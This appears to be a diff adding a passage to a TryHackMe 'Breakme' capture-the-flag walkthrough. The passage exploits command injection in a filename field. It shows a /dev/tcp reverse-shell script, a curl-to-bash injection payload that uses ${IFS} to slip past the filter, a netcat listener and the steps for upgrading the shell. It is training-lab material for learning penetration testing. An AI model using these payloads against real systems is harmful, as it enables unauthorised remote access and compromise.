@@ -268,6 +268,46 @@ Lastly, when we enter a file name we will see that the file name entered is chec
 2024/09/26 23:39:06 CMD: UID=1002  PID=1445   | sh -c find /opt -name "filename" 2>/dev/null 
 ```
 
+This tells us that our user input is used to run system commands on the target. We can start thinking of command injection and start investigating the web application with different payloads. We will notice that most of the injection payloads are filtered out but the | is passed without any problem. We can host a reverse shell on our attack host and execute it on the target using curl and bash. We first need to create the reverse shell file and start the Python HTTP server.
+```bash
+┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Breakme/Misc File]
+└─$ echo '/bin/sh -i >& /dev/tcp/10.8.23.19/4444 0>&1' > shell.sh
+
+┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Breakme/Misc File]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+
+Now that we host the malicious shell on our attack host, we can start a listener on our attack host and send the payload to our target for execution.
+```bash
+┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Breakme]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+```
+
+```payload
+john|curl${IFS}10.8.23.19/shell.sh${IFS}|/bin/bash
+```
+![](/assets/img/posts/walthrough/tryhackme/2024-09-27-breakme/payload-sent.png)
+
+If we return to our listener, we will notice a reverse connection from the target and this time have a connection as the user John. We can upgrade this shell to a fully interactive shell and read the user's flag as shown below.
+```bash
+┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Breakme]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.8.23.19] from (UNKNOWN) [10.10.230.208] 37170
+/bin/sh: 0: can't access tty; job control turned off
+$  python3 -c 'import pty; pty.spawn("/bin/bash")' 
+john@Breakme:~/internal$ ^Z
+zsh: suspended  nc -lvnp 4444
+
+┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Breakme]
+└─$ stty raw -echo;fg
+[1]  + continued  nc -lvnp 4444
+                               export TERM=xterm
+john@Breakme:~$ ls
+internal  user1.txt
+```
 
 
 
